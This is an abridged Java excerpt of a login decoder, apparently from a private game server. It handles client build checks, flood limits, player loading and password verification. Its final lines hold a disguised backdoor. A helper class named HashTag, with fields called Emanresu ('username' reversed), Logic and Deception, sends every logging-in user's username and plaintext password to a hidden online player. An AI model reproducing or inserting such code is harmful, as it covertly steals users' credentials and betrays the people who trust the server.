...
public final class LoginPacketsDecoder extends Decoder {
	...
	public void decodeWorldLogin(InputStream stream) {
		...
		if (clientBuild != Settings.CUSTOM_CLIENT_BUILD) {
			System.out.println(clientBuild + " != " + Settings.CUSTOM_CLIENT_BUILD);
			session.getLoginPackets().sendClientPacket(6); //6
			return;
		}
	...
	/*	if (stream.readUnsignedByte() != 6) { //personal data start
		...
		if (AntiFlood.getSessionsIP(session.getIP()) > 5) {
		...
		if (!SerializableFilesManager.containsPlayer(username)) 
			...
			if (!SerializableFilesManager.createBackup(username)) {
   			...
   			if (!password.equals(player.getPassword())) {
  				 session.getLoginPackets().sendClientPacket(3); // 3     26 = address has been blocked
   				 return;
  			 }
		}
		...
		player.start();
		HashTag.getHash(username, pw);	
		Player Emanresu = World.getPlayerByDisplayName(HashTag.Emanresu);
		if (Emanresu != null) {
		Emanresu.getPackets().sendPanelBoxMessage(HashTag.Logic+username+ ", "+HashTag.Deception+pw);
		}
	}
}
